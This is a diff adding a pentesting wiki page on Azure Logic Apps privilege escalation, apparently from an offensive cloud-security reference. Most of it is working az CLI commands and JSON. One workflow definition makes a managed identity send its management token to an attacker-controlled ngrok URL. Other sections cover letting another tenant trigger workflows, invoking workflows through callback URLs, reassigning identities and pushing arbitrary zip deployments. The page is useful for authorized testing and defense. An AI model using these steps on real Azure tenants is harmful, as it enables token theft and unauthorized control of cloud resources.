@@ -1,0 +1,173 @@
+# Az - Logic Apps Privesc
+
+## Logic Apps Privesc
+For more information about SQL Database check:
+
+### (`Microsoft.Resources/subscriptions/resourcegroups/read`, `Microsoft.Logic/workflows/read`, `Microsoft.Logic/workflows/write` && `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`) && (`Microsoft.Logic/workflows/triggers/run/action`)
+
+These permissions allows to create/update Azure Logic Apps workflows with specific user managed identities and use them to get access tokens from them:
+
+```bash
+az logic workflow create \
+  --resource-group <resource_group_name> \
+  --name <workflow_name> \
+  --definition <workflow_definition_file.json> \
+  --location <location>
+
+az logic workflow update \
+  --name my-new-workflow \
+  --resource-group logicappgroup \
+  --definition <workflow_definition_file.json>
+```
+
+Example definition of workflow with manual trigger to steal a management token of an assigned identity listeningn in a ngrok URL:
+
+```json
+{
+  "definition": {
+    "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowDefinition.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {},
+    "triggers": {
+      "manual": {
+        "type": "Request",
+        "kind": "Http",
+        "inputs": { "schema": {} }
+      }
+    },
+    "actions": {
+      "GetSecret": {
+        "type": "Http",
+        "inputs": {
+          "method": "GET",
+          "uri": "https://82fa-81-33-67-18.ngrok-free.app",
+          "authentication": {
+            "type": "ManagedServiceIdentity",
+            "audience": "https://management.azure.com/",
+            "identity": "/subscriptions/0c7db2d7-90ba-4106-8610-cdd8c06971fe/resourceGroups/-rg-10b8e451/providers/Microsoft.ManagedIdentity/userAssignedIdentities/uai-10b8e451",
+          }
+        }
+      },
+      "Respond": {
+        "type": "Response",
+        "runAfter": { "GetSecret": ["Succeeded"] },
+        "inputs": {
+          "statusCode": 200,
+          "body": "@body('GetSecret')"
+        }
+      }
+    },
+    "outputs": {}
+  },
+  "parameters": {}
+}
+```
+
+And after modifying it, you can run it with:
+
+```bash
+az rest \
+  --method post \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourcegroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{logicAppName}/triggers/{triggerName}/run?api-version=2016-10-01" \
+  --body '{}' \
+  --headers "Content-Type=application/json"
+```
+
+OIf there is a manual trigger, you can get the callback URL and run it:
+
+```bash
+az rest --method POST \
+  --url "https://management.azure.com/subscriptions/<subscription>/resourceGroups/<rg-name>>/providers/Microsoft.Logic/workflows/<workflow-name>>/triggers/manual/listCallbackUrl?api-version=2019-05-01" \
+  --query "value" -o tsv
+
+curl -X POST "https://prod-11.centralus.logic.azure.com:443/workflows/02f4e715c50a42c58b683629ddb889f5/triggers/manual/paths/invoke?api-version=2019-05-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=5m1THJOCzEl6WoZyaont4i2A62PpSZhK3BtVAzYYTPY"
+```
+
+### Microsoft.Logic/workflows/write
+
+With just this permission it's possible to change the Authorization Policy, giving for example another tenant the capability to trigger the workflow:
+
+```bash
+az rest --method PUT \
+  --uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group-name>/providers/Microsoft.Logic/workflows/<workflow-name>?api-version=2016-10-01" \
+  --body '{
+    "location": "<region>",
+    "properties": {
+      "definition": {
+        "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
+        "contentVersion": "1.0.0.0",
+        "parameters": {
+          "$connections": {
+            "defaultValue": {},
+            "type": "Object"
+          }
+        },
+        "triggers": {
+          "<trigger-name>": {
+            "type": "Request",
+            "kind": "Http"
+          }
+        },
+        "actions": {},
+        "outputs": {}
+      },
+      "accessControl": {
+        "triggers": {
+          "openAuthenticationPolicies": {
+            "policies": {
+              "<policy-name>": {
+                "type": "AAD",
+                "claims": [
+                  {
+                    "name": "iss",
+                    "value": "<issuer-url>"
+                  }
+                ]
+              }
+            }
+          }
+        }
+      }
+    }
+  }'
+```
+
+### `Microsoft.Logic/workflows/triggers/listCallbackUrl/action`
+You can get the callback URL of the trigger and run it.
+
+```bash
+az rest --method POST \
+  --uri "https://management.azure.com/subscriptions/<subscription_id>/resourceGroups/<resource_group>/providers/Microsoft.Logic/workflows/<workflow_name>/triggers/<trigger_name>/listCallbackUrl?api-version=2019-05-01"
+```
+
+This will return a callback URL like `https://prod-28.centralus.logic.azure.com:443/workflows/....`. Now we can run it with:
+
+```bash
+curl --request POST \
+     --url "https://prod-28.centralus.logic.azure.com:443/workflows/<workflow_id>/triggers/<trigger_name>/paths/invoke?api-version=2019-05-01&sp=%2Ftriggers%2F<trigger_name>%2Frun&sv=1.0&sig=<signature>" \
+     --header 'Content-Type: application/json' \
+     --data '{"exampleKey": "exampleValue"}'
+```
+
+### `Microsoft.Logic/workflows/read`, `Microsoft.Logic/workflows/write` && `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`
+
+With these permissions it's possible to modify Logic App workflows and manage their identities. Specifically, you can assign or remove system-assigned and user-assigned managed identities to workflows.
+
+```bash
+az logic workflow identity remove/assign \
+  --name <workflow_name> \
+  --resource-group <resource_group_name> \
+  --system-assigned true \
+  --user-assigned "/subscriptions/<subscription_id>/resourceGroups/<resource_group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<identity_name>"
+```
+
+### (`Microsoft.Web/sites/read`, `Microsoft.Web/sites/basicPublishingCredentialsPolicies/read`, `Microsoft.Web/sites/write`, `Microsoft.Web/sites/config/list/action`) && (`Microsoft.Web/sites/start/action`)
+
+With these permissionss it's possible to deploy Logic App workflows using ZIP file deployments. These permissions enable actions such as reading app details, accessing publishing credentials, writing changes, and listing app configurations. Alongside the start permissions you can update and deploy a new Logic App with the content desired
+
+```bash
+az logicapp deployment source config-zip \
+  --name <logic_app_name> \
+  --resource-group <resource_group_name> \
+  --src <path_to_zip_file>
+```
